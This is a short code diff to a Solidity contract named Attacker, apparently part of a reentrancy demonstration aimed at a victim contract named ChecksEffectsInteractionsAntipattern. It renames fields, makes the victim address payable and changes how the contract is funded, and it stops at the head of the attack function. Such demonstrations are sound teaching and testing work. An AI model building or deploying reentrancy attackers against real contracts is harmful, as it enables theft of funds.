@@ -6,17 +6,17 @@ contract Attacker {
   ChecksEffectsInteractionsAntipattern v;
   uint256 public count;
   uint amount = 1 ether;
-  address public victims_address;
+  address payable public victimAddress;
 
   event LogFallback(uint c, uint balance);
 
   constructor (ChecksEffectsInteractionsAntipattern victim) {
-    victims_address = address(victim);
-    v = ChecksEffectsInteractionsAntipattern(victim);
+    victimAddress = address(victim);
+    v = ChecksEffectsInteractionsAntipattern(victimAddress);
   }
 
-  function set_balance () public {
-     victims_address.call{value: amount}("");
+  function setBalance() public payable {
+     victimAddress.call{value: msg.value}("");
   }
 
   function attack () public {
